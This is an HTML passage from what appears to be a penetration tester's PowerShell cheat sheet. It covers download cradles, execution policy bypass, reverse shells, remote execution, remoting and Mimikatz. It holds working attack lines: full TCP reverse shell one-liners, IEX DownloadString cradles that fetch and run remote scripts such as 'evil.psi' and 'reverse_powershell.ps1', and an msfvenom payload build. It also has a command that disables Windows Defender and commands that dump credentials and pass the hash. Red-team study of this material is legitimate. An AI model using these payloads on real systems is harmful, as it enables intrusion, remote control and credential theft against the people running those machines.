<li><a href="http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html">http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html</a></li>
<li>Process tracking and Module logging.</li>
<li>ACL, Software Restriction Policies (SRP) and Application Control Policies (Applocker) could be used to control PowerShell.                                                                          <ul>
<li>Both aresupported by GPO, your mileage may vary according to your implementation preferences.</li>
<li><code>__PSLockDownPolicy</code> (v3 only)</li>
</ul>
</li>
<li>Just Enough Admin – Restrict Administrative Rights - <a href="http://blogs.technet.com/b/privatecloud/archive/2014/05/14/just-enough-administration-step-by-step.aspx">http://blogs.technet.com/b/privatecloud/archive/2014/05/14/just-enough-administration-step-by-step.aspx</a></li>
<li>Auditing, Base lining and Incident Management<ul>
<li>PoshSec - <a href="https://github.com/PoshSec">https://github.com/PoshSec</a></li>
<li>Kansa - <a href="https://github.com/davehull/Kansa">https://github.com/davehull/Kansa</a></li>
<li>Voyeur - <a href="https://github.com/silverhack/voyeur/">https://github.com/silverhack/voyeur/</a></li>
<li>Using Virus Total API - <a href="https://github.com/darkoperator/Posh-VirusTotal">https://github.com/darkoperator/Posh-VirusTotal</a></li>
</ul>
</li>
<li>Investigating PowerShell attacks <a href="https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks-UPDATED.pdf">https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks-UPDATED.pdf</a></li>
</ul>
</li>
<li>Bypass<ul>
<li>Bypassing Applocker Policies - <a href="http://www.sixdub.net/2014/12/02/inexorable-powershell-a-red-teamers-tale-of-overcoming-simple-applocker-policies/">http://www.sixdub.net/2014/12/02/inexorable-powershell-a-red-teamers-tale-of-overcoming-simple-applocker-policies/</a></li>
<li>Allowing the execution of Powershell functionality without the use of Powershell.exe (.Net): <a href="https://github.com/Veil-Framework/PowerTools/tree/master/PowerPick">https://github.com/Veil-Framework/PowerTools/tree/master/PowerPick</a></li>
</ul>
</li>
<li>Save output
    <div class="highlight"><pre><span></span><code>Get-Service | Export-CSV C:\Temp\AllServices.CSV –NoTypeInfo
Get-User –Filter ‘Name –Like “*John”’ | Export-CSV C:\Temp\AllUsers.CSV –NoTypeInfo
Get-ChildItem –Path C:\Windows\System32 | Export-CSV C:\Temp\AllFiles.CSV -NoTypeInfo
</code></pre></div></li>
<li>Reboots: <code>Get-EventLog –Log System –Newest 100 | Where-Object {$_.EventID –eq ‘1074’} | FT MachineName, UserName, TimeGenerated -AutoSize</code></li>
<li>Search hotfix: <code>Get-HotFix –ID KB2877616</code></li>
<li>Backup Group Policy: <code>Backup-GPO –All –Path C:\Temp\AllGPO</code></li>
<li>Check if all DCs are Global Catalog Servers: <code>Get-ADDomainController –Filter * | Select Hostname, IsGlobalCatalog</code></li>
<li>Powershell with HID<ul>
<li><a href="https://github.com/samratashok/Kautilya/">https://github.com/samratashok/Kautilya/</a></li>
<li><a href="http://www.labofapenetrationtester.com/search/label/Kautilya">http://www.labofapenetrationtester.com/search/label/Kautilya</a></li>
<li><a href="http://www.irongeek.com/i.php?page=security/plug-and-prey-malicious-usb-devices">http://www.irongeek.com/i.php?page=security/plug-and-prey-malicious-usb-devices</a></li>
</ul>
</li>
<li>TCP / UDP / WMI Shells: <a href="https://github.com/samratashok/nishang/tree/master/Shells">https://github.com/samratashok/nishang/tree/master/Shells</a></li>
</ul>
<h2 id="download-files">Download Files<a class="headerlink" href="#download-files" title="Permanent link">&para;</a></h2>
<p><div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="nb">wget </span><span class="s2">&quot;http://example.com/abc.txt&quot;</span> <span class="n">-outfile</span> <span class="s2">&quot;abc.txt&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://192.168.0.17/PS_TCP4.ps1&quot;</span> <span class="n">-OutFile</span> <span class="nv">$fullpath</span><span class="p">;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>powershell -c <span class="s2">&quot;Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="k">echo</span> $webclient = New-Object System.Net.WebClient <span class="p">&gt;</span>wget.ps1
<span class="k">echo</span> $url = <span class="s2">&quot;http://10.10.10.10/example.exe&quot;</span> <span class="p">&gt;&gt;</span>wget.ps1
<span class="k">echo</span> $file = <span class="s2">&quot;example.exe&quot;</span> <span class="p">&gt;&gt;</span>wget.ps1
<span class="k">echo</span> $webclient.DownloadFile($url,$file) <span class="p">&gt;&gt;</span>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInterative -NoProfile -File wget.ps1
</code></pre></div></p>
<ul>
<li>Base64 encoded payload delivery
    <div class="highlight"><pre><span></span><code><span class="k">echo</span> <span class="s2">&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://172.16.67.128:80/6WcepYO&#39;)&quot;</span> <span class="p">|</span> iconv --to-code UTF-16LE <span class="p">|</span> base64 -w 0
</code></pre></div>
    <div class="highlight"><pre><span></span><code>kaliwmis-32 -U administrator%badpassword //10.10.10.10 <span class="s2">&quot;cmd.exe /c  powershell.exe -nop -enc &lt;base64-value&gt;&quot;</span>
</code></pre></div></li>
</ul>
<h2 id="execution-policy">Execution Policy<a class="headerlink" href="#execution-policy" title="Permanent link">&para;</a></h2>
<ul>
<li>Not a security feature</li>
<li>Used to avoid accidental script execution</li>
<li>Can be bypass with:<ul>
<li><code>powershell.exe -exec Bypass</code></li>
<li><code>powershell -ExecutionPolicy bypass .\example.ps1</code></li>
<li><code>powershell -c &lt;cmd&gt;</code></li>
<li><code>powershell -EncodedCommand &lt;cmd&gt;</code></li>
<li><code>powershell -enc &lt;cmd&gt;</code></li>
<li><code>$env:PSExecutionPolicyPreference="bypass"</code></li>
</ul>
</li>
<li>Ref: <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6</a></li>
<li>15 ways to bypass PowerShell execution policy: <a href="https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy">https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy</a></li>
</ul>
<h2 id="reverse-shell">Reverse Shell<a class="headerlink" href="#reverse-shell" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html">http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html</a>
    <div class="highlight"><pre><span></span><code><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="err">“</span><span class="n">powershell</span><span class="err">”</span> <span class="n">-argumentlist</span> <span class="err">“</span><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="err">‘</span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">30</span><span class="p">/</span><span class="n">adminshell</span><span class="p">.</span><span class="n">ps1</span><span class="err">’</span><span class="p">)</span><span class="err">”</span> <span class="n">-Credential</span> <span class="nv">$cred</span>

<span class="n">msfvenom</span> <span class="n">-a</span> <span class="n">x86</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">Windows</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">exec</span> <span class="n">CMD</span><span class="p">=</span><span class="s2">&quot;powershell -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1&#39;)&quot;</span> <span class="n">-e</span> <span class="n">x86</span><span class="p">/</span><span class="n">unicode_mixed</span> <span class="n">-b</span> <span class="s1">&#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39;</span> <span class="n">BufferRegister</span><span class="p">=</span><span class="n">EAX</span> <span class="o">-f</span> <span class="n">python</span> <span class="p">&gt;</span> <span class="n">shellcode</span>
</code></pre></div>
    <div class="highlight"><pre><span></span><code>powercat -l -v -p 4444 -t 1000
</code></pre></div>
    <div class="highlight"><pre><span></span><code>powershell -e <span class="s2">&quot;&lt;encoded-payload&gt;&quot;</span>
</code></pre></div>
    <div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&quot;10.10.10.10&quot;</span><span class="p">,</span><span class="n">80</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&quot;PS &quot;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">&quot;&gt; &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</code></pre></div>
    <div class="highlight"><pre><span></span><code><span class="nv">$sm</span><span class="p">=(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&quot;192.168.254.1&quot;</span><span class="p">,</span><span class="n">55555</span><span class="p">)).</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bt</span><span class="p">=</span><span class="n">0</span><span class="p">..</span><span class="n">255</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span><span class="p">=</span><span class="nv">$sm</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bt</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$bt</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$d</span><span class="p">=(</span><span class="nb">New-Object</span> <span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bt</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span><span class="nv">$st</span><span class="p">=(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">((</span><span class="nb">iex </span><span class="nv">$d</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span><span class="p">));</span><span class="nv">$sm</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$st</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$st</span><span class="p">.</span><span class="n">Length</span><span class="p">)}</span>
</code></pre></div></li>
</ul>
<h2 id="remote-script-execution">Remote Script execution<a class="headerlink" href="#remote-script-execution" title="Permanent link">&para;</a></h2>
<p>- <code>Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');</code>
  - <code>iex (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');</code>
  - <code>powershell -EncodedCommand &lt;Base64EncodedCommand&gt;</code>
  - <code>$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://example.com/example.ps1');sleep 5;$resp=$ie.Document.Body.innerHTML;$ie.quit();iex $resp</code>
  - <code>iex (iwr 'http://example.com/example.ps1')</code>
  - <code>$h=New-Object -ComObject Msxm12.XMLHTTP;$h.open('GET', 'http://192.168.230.1/evil.psi1' ,$false);$h.send();iex $h. responseText</code>
  - Craft Download Cradles: <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">https://github.com/danielbohannon/Invoke-CradleCrafter</a>
    <div class="highlight"><pre><span></span><code><span class="nb">START </span><span class="p">/</span><span class="n">B</span> <span class="s2">&quot;&quot;</span> <span class="n">powershell</span> <span class="n">-c</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.2/shell.ps1&#39;</span><span class="p">)</span>
<span class="c"># _/B prevents creation of a new window_</span>
</code></pre></div>
    <div class="highlight"><pre><span></span><code><span class="nv">$wr</span> <span class="no">[System.NET.WebRequest]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&quot;http://192.168.230.1/evil.psi&quot;</span><span class="p">)</span>
<span class="nv">$r</span> <span class="p">=</span> <span class="nv">$wr</span><span class="p">.</span><span class="n">GetResponse</span><span class="p">()</span>
<span class="nb">IEX </span><span class="p">(</span><span class="no">[System.IO.StreamReader]</span> <span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">GetResponseStream</span><span class="p">()))</span> <span class="p">.</span><span class="n">ReadToEnd</span><span class="p">()```</span>
</code></pre></div></p>
<h2 id="powershell-remoting">Powershell Remoting<a class="headerlink" href="#powershell-remoting" title="Permanent link">&para;</a></h2>
<ul>
<li>Enabled by default from Windows Server 2012<ul>
<li><code>Enable-PSRemoting -Force</code></li>
</ul>
</li>
<li>Admin privileges are required to connect</li>
<li><code>Get-Command -CommandType cmdlet -ParameterName computername</code></li>
<li><code>Get-Command -CommandType cmdlet | Where-Object {$_Parameters.Keys --contains 'ComputerName' -and $_Parameters.Keys --contains 'Credential' -and $_Parameters.Keys --notcontains 'Session'}</code></li>
<li>WSMAN (WebServicesManagement) Protocol (WinRM)<ul>
<li>WinRM is Microsoft’s implementation of WSMAN</li>
<li>Port 5985, 5986</li>
<li>If target is in a workgroup, attacker's machine should trust target machine to send out credentials:<ul>
<li>Set-Item  WSMan:\localhost\client\trustedhosts -Value *</li>
</ul>
</li>
<li><code>Invoke-Command -ScriptBlock {$env:ComputerName} -ComputerName example -Credential dominName/userName</code><ul>
<li><code>-FilePath</code>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-WSManAction</span> <span class="n">-Action</span> <span class="n">Create</span> <span class="n">-ResourceURI</span> <span class="n">wmicimv2</span><span class="p">/</span><span class="n">win32_process</span> <span class="n">-ValueSet</span> <span class="p">@{</span><span class="n">commandline</span><span class="p">=</span><span class="s2">&quot;powershell.exe -c Get-Process&quot;</span><span class="p">}</span> <span class="p">-</span> <span class="n">ComputerName</span> <span class="n">domainpc</span> <span class="err">–</span><span class="n">Credential</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-WSManAction</span> <span class="n">-Action</span> <span class="n">Create</span> <span class="n">-ResourceURI</span> <span class="n">wmicimv2</span><span class="p">/</span><span class="n">win32_process</span> <span class="n">-ValueSet</span> <span class="p">@{</span><span class="n">commandline</span><span class="p">=</span><span class="s2">&quot;powershell.exe -c iex ((New-Object Net.Webclient).DownloadString(&#39;http://192.168.254. 1/reverse_powershell.ps1&#39;))&quot;</span><span class="p">}</span> <span class="n">-ComputerName</span> <span class="n">domainpc</span>
</code></pre></div></li>
</ul>
</li>
</ul>
</li>
<li>WSMAN vs PowerShell Remoting vs WMI<ul>
<li>WSMAN<ul>
<li>Firewall friendly</li>
<li>Use HTTP and HTTPS ports</li>
<li>Syntax is complex</li>
<li>Returns immutable objects</li>
<li>Can be used with non-Windows machines</li>
</ul>
</li>
<li>Powershell Remoting<ul>
<li>Firewall friendly</li>
<li>Easy use</li>
<li>Returns immutable objects</li>
</ul>
</li>
<li>WMI<ul>
<li>Not firewall friendly</li>
<li>Not NAT friendly</li>
<li>Complex</li>
<li>Returns editable objects</li>
</ul>
</li>
</ul>
</li>
<li>One to One<ul>
<li><code>Invoke-Command</code> is stateless for stageful operations use <code>PSSession</code><ul>
<li>Interactive, stateful session</li>
<li>Run in a new process <code>wsmprovhost</code></li>
</ul>
</li>
<li>New-PSSession<ul>
<li><code>$ses = New-PSSession -ComputerName &lt;name&gt; -Credential &lt;cred&gt;</code></li>
<li><code>Get-PSSession</code></li>
<li><code>Enter-PSSession</code></li>
</ul>
</li>
<li>Interactive session: <code>Enter-PSSession -Sessions $ses</code><ul>
<li><code>​$cred = Get-Credential</code> -&gt; <code>Enter-PSSession -ComputerName 10.0.24.244 -Authentication Negotiate -Credential $cred</code></li>
</ul>
</li>
<li>Define a function in a remote machine and call it:
  <div class="highlight"><pre><span></span><code>Invoke-Command -ScriptBlock {function Example1 {whoami;}} -Session $ses
Invoke-Command -ScriptBlock {Example1} -Session $ses
PSSession -CommandName Example1 -Session $ses
</code></pre></div></li>
<li>Export a command from a remote machine:
  <div class="highlight"><pre><span></span><code>Export-PSSession -Module &lt;name&gt; -CommandName Example1 -Session $ses
</code></pre></div></li>
<li>Double Hop Problem (Attacker delegate sending token to target-2 from target-1)
  <img alt="image-20190615074509591" src="../_assets/image-20190615074509591.png" />
  <div class="highlight"><pre><span></span><code>Enable-WSManCredSSP -Role Client -DelegateComputer
Enable-WSManCredSSP -Role Server
Get-WSManCredSSP
Enter-PSSession -ComputerName &lt;name&gt; -Credential &lt;cred&gt; -Authentication CredSSP
</code></pre></div></li>
<li>Useful cmdlets<ul>
<li>New-PSSession</li>
<li>Enter-PSSession
  <div class="highlight"><pre><span></span><code><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span> <span class="c">#Disable Windows Defender</span>
<span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">instance</span>
<span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">instance</span>
<span class="nb">Enter-PSSEssion</span> <span class="p">-</span> <span class="n">Session</span> <span class="nv">$sess</span>
</code></pre></div></li>
</ul>
</li>
</ul>
</li>
<li>One to Many (Fan-out Remoting)<ul>
<li>Non-interactive</li>
<li>Parallel command execution</li>
<li>Can:<ul>
<li>Execute scripts from files</li>
<li>Run commands on multiple remote computers</li>
<li>Run commands in disconnected sessions (v3)</li>
<li>Run as background task</li>
</ul>
</li>
<li>Useful in:<ul>
<li>Perform command execution without dropping exe onto disk</li>
<li>Useful for passing and replying hashes, tickets and other AD attacks</li>
</ul>
</li>
<li>Run commands: <ul>
<li><code>Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName instance</code></li>
<li><code>Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content &lt;list-of-servers&gt;)</code></li>
</ul>
</li>
<li>Run scripts: <ul>
<li><code>Invoke-Command -FilePath example.ps1 -ComputerName instance</code></li>
</ul>
</li>
<li>Run functions installed on the remote box: <ul>
<li><code>Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName instance</code></li>
</ul>
</li>
<li><code>Invoke-Command</code> doesn't create a session.</li>
<li>Stateful commands:
  <div class="highlight"><pre><span></span><code><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">instance</span>
<span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$proc</span> <span class="p">=</span> <span class="nb">Get-Process</span><span class="p">}</span>
<span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$proc</span><span class="p">.</span><span class="n">Name</span><span class="p">}</span>
</code></pre></div></li>
</ul>
</li>
</ul>
<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>Mimikatz (ReflectivePEInjection is used to load into memory)</p>
<ul>
<li>Uses <code>ReflectivePEInjection</code> <a href="https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/">https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/</a> to load mimikatz into memory</li>
<li>Pass the Hash
  <div class="highlight"><pre><span></span><code>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::pth /user:&lt;name_of_the_user&gt; /domain:. /ntlm:&lt;ntlmhash&gt; /run:powershell.exe&quot;&#39;
</code></pre></div>
  <div class="highlight"><pre><span></span><code>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::pth /user:Administrator  /domain:. /ntlm:&lt;ntlmhash&gt; /run:powershell.exe&quot;&#39;
</code></pre></div>
  <div class="highlight"><pre><span></span><code>Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCerts
</code></pre></div></li>
</ul>
<ul>
<li>Dump Creds from multiple machines
  <div class="highlight"><pre><span></span><code>Invoke-Mimikatz -DumpCreds -ComputerName @(&quot;instance1&quot;, &quot;instance2&quot;)
</code></pre></div></li>
<li>Load PowerUp
  <div class="highlight"><pre><span></span><code>powershell -ExecutionPolicy Bypass
Import-Module ./PowerUp.ps1
Invoke-AllChecks
</code></pre></div></li>
</ul>
</li>
</ul>
<h2 id="active-directory">Active Directory<a class="headerlink" href="#active-directory" title="Permanent link">&para;</a></h2>
<ul>
<li>[ADSI]<ul>
<li>Get member of the domain admin group: <code>([ADSI]"LDAP://cn=Domain Admin,cn=Users,dc=Example,dc=com").Members</code></li>
<li>Get memberships of a user: <code>([ADSI]"LDAP://cn=Administrator,cn=Users,dc=Example,dc=com").MemberOf</code></li>
</ul>
</li>
<li>.NET Class: <code>System.DirectoryServices.ActiveDirectory</code></li>
<li>Native Executable</li>
<li>PowerShell (,Net classes or WMI or AD module)</li>
</ul>
<h2 id="net">.Net<a class="headerlink" href="#net" title="Permanent link">&para;</a></h2>
<ul>
<li>Exploring Assemblies<ul>
<li>Finding assemblies
  <div class="highlight"><pre><span></span><code>$Classes = [AppDomain]::CurrentDomain.GetAssemblies()
$Classes = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {$_.GetTypes()} | Where-Object {$_.IsPublic -eq &quot;True&quot;}
</code></pre></div></li>
<li>Working with assemblies and invoking functions
  <div class="highlight"><pre><span></span><code>$ProcClass = $Classes | Where-Object {$_.Name -eq &quot;Proccess&quot;}
$ProcClass | Get-Members
$ProcClass | Get-Members -MemberType Method -Static
$ProcClass.GetMethods()
$ProcClass::GetCurrentProcess()
$ProcClass.FullName

[System.Diagnostic.Process]::GetCurrentProcess()

[System.Diagnostic.Process] | Get-Members -MemberType Method -Static | Format-List *
</code></pre></div>
  <div class="highlight"><pre><span></span><code>Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Sendkeys]
</code></pre></div></li>
<li>AssemblyName
  <div class="highlight"><pre><span></span><code>Add-Type -AssemblyName System.ServiceProcess
[System.ServiceProcess.ServiceController] | Get-Members -MemberType Method -Static | Format-List *
[System.ServiceProcess.ServiceController]::GetDevices()
</code></pre></div></li>
<li>TypeDefinition
  <div class="highlight"><pre><span></span><code>$DotnetCode = @&quot;
public class SysCommands

public static void lookup (string domainname) {
System. Diagnostics.Process.Start(&quot;ns lookup.exe&quot;, domainname) ;
}

public void netcmd (string cmd) {
string cmdstring = &quot;/k net.exe &quot; + cmd;
System. Diagnostics.Process.Start(&quot;cmd. exe&quot; ,cmdstring) ;
}

public static void Main() {
string cmdstring = &quot;/k net.exe &quot; + &quot;user&quot;;
System. Diagnostics.Process.Start(&quot;cmd. exe&quot;,cmdstring);
}
&quot;@

# Compile .Net code and load objects from it
Add-Type -TypeDefinition $DotnetCode -OutputType Library -OutputAssembly SysCommand.dll
Add-Type -TypeDefinition $DotnetCode -OutputType ConsoleApplication -OutputAssembly SysCommand.exe
[SysCommand]::lookup(&quot;google.com&quot;)

# Load objects from a DLL into Memory
$obj = Add-Type -Path SysCommand.dll -PassThru
$obj | Get-Members
[SysCommand]::lookup(&quot;google.com&quot;)

# Calling non-static functions
$obj = New-Object SysCommands
$obj .netcmd(&quot;user&quot;)#&gt;
</code></pre></div></li>
<li>MemberDefinition - DLL Import
  <div class="highlight"><pre><span></span><code>$Apicode = @&quot;

[DllImport(&quot;kerne132.d11&quot;)]
public static extern bool CreateSymbolicLink(string IpSymlinkFileName, string IpTargetFileName, int dwFlags);

&quot;@

$SymLink = Add-Type -MemberDefinition $ApiCode -Name Symlink -Namespace CreatSymLink -PassThru
$SymLink::CreateSymbolicLink(&#39;C:\test\link&#39;, &#39;C:\Users\&#39;, 1)
</code></pre></div></li>
</ul>
</li>
</ul>
<h2 id="wmi">WMI<a class="headerlink" href="#wmi" title="Permanent link">&para;</a></h2>
<ul>
<li>Exploring namespaces: <code>Get-WmiObject -Namespace "root" -Class "__Namespace" | select name</code></li>
<li>List even the nested namespaces: <a href="http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/">http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/</a></li>
<li>Exploring Classes: <code>Get-WmiObject –NameSpace “&lt;namespace&gt;” –List</code></li>
<li>Exploring Methods: <code>Get-WmiObject -Class &lt;class&gt; -List | Select-Object -ExpandProperty Methods</code></li>
<li>Filter based on properties of objects getting returned: 
    <div class="highlight"><pre><span></span><code>Get-WmiObject -Class Win32_Process -Filter (Name = &quot;powershell.exe&quot;)
Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq &quot;powershell.exe&quot;}
Get-WmiObject -Query {Select * from Win32_Process where Name = &quot;powershell.exe&quot;}
</code></pre></div>
    <div class="highlight"><pre><span></span><code>Remove-WmiObject
</code></pre></div>
    <div class="highlight"><pre><span></span><code>Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;notepad.exe&quot;
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;notepad.exe&quot; - ComputerName &lt;name&gt; -Credential &lt;cred&gt;  
</code></pre></div></li>
</ul>
<h2 id="com-objects">COM Objects<a class="headerlink" href="#com-objects" title="Permanent link">&para;</a></h2>
<ul>
<li>Explore available COM objects:
    <div class="highlight"><pre><span></span><code>Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -include PROGID -recurse | foreach {$_.GetValue(&quot;&quot;)} | Where-Object {$_ -match “&lt;appname&gt;&quot;}
</code></pre></div>
    <div class="highlight"><pre><span></span><code>$wscript = New-Object -ComObject WScript.Shell.1
$wscript | Get-Member
$wscript.CurrentDirectory
$wscript.SendKeys(&quot;Hello&quot;)
$wscript.Exec(&quot;cmd&quot;)
$wscript.CreateShortcut(...)
</code></pre></div></li>
<li>Interesting COM Objects<ul>
<li>WScript.Shell.1</li>
